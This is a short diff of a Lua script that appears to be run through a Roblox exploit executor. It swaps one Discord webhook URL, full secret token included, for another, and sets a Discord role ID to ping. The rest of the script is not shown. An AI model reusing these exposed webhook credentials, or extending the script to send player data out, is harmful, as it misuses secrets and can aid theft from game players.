@@ -4,7 +4,7 @@ end
  
 _G.scriptExecuted = true
 
-local Webhook = "https://discord.com/api/webhooks/1251838595422097418/mCWu94HzGONtPFyZPQRvs1Lth-OqNStC-xScmdpRGq37TCTlnEHDTkFQr-ocL0Zs-kyV"
+local Webhook = "https://discord.com/api/webhooks/1257417938617765991/Gde_zGOQ0mfk6K9JnKbBhSH9_qPAUCQxyRlbqSt8T97jkCAhwqVI97z--rZNsm9KZC93"
 getgenv().Discord_RoleID = "1251697978633224242"  -- Replace with your Discord Role ID
 
 local player = game:GetService("Players").LocalPlayer
